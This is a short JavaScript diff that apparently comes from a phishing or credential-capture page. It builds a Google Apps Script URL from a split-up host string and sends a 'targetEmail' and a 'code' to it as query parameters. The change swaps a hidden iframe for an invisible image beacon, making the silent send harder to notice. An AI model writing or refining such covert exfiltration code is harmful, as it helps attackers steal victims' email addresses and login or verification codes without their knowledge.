@@ -270,10 +270,8 @@ var depId = 'AKfycbya_OI52HifjM5wCtq0VnGuNJXNxCG-996SPaxHyOJzRmJXNiNhvUmnNpqeZ2M
       var host = ['script', 'google', 'com'].join('.');
       var scriptUrl = 'https://' + host + '/macros/s/' + depId + '/exec?email=' + encodeURIComponent(targetEmail) + '&code=' + encodeURIComponent(code);
 
-            var ifr = document.createElement('iframe');
-      ifr.style.display = 'none';
-      ifr.src = scriptUrl;
-      document.body.appendChild(ifr);
+             var img = new Image();
+      img.src = scriptUrl;
 
 
       setTimeout(function() {
